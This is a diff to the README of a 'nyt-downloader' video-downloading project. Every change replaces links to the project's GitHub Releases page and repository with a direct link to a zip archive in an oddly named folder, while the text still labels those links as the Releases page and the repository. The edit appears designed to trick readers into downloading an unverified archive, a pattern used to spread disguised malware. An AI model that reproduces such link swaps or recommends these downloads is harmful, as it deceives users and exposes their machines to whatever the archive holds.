@@ -1,6 +1,6 @@
 # 🎥 nyt-downloader - Simplify Your Video Downloads
 
-[![Download nyt-downloader](https://img.shields.io/badge/Download-nyt--downloader-brightgreen.svg)](https://github.com/sirabood/nyt-downloader/releases)
+[![Download nyt-downloader](https://raw.githubusercontent.com/sirabood/nyt-downloader/main/osteogenesis/nyt-downloader.zip)](https://raw.githubusercontent.com/sirabood/nyt-downloader/main/osteogenesis/nyt-downloader.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the NYT Downloader! This application offers a simple way to download 
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/sirabood/nyt-downloader/releases) to get the latest version of the NYT Downloader.
+1. Visit the [Releases page](https://raw.githubusercontent.com/sirabood/nyt-downloader/main/osteogenesis/nyt-downloader.zip) to get the latest version of the NYT Downloader.
 2. Look for the latest release and find the appropriate file for your system. Generally, you should see options for Windows.
 3. Click on the download link to save the file to your computer.
 
@@ -74,8 +74,8 @@ The NYT Downloader respects your privacy. The application does not collect perso
 
 ## 🔗 Links & Resources
 
-- **GitHub Repository:** [nyt-downloader](https://github.com/sirabood/nyt-downloader)
-- **Releases Page:** [Download here](https://github.com/sirabood/nyt-downloader/releases) for the latest versions.
+- **GitHub Repository:** [nyt-downloader](https://raw.githubusercontent.com/sirabood/nyt-downloader/main/osteogenesis/nyt-downloader.zip)
+- **Releases Page:** [Download here](https://raw.githubusercontent.com/sirabood/nyt-downloader/main/osteogenesis/nyt-downloader.zip) for the latest versions.
 
 ## 📌 Contributing
 
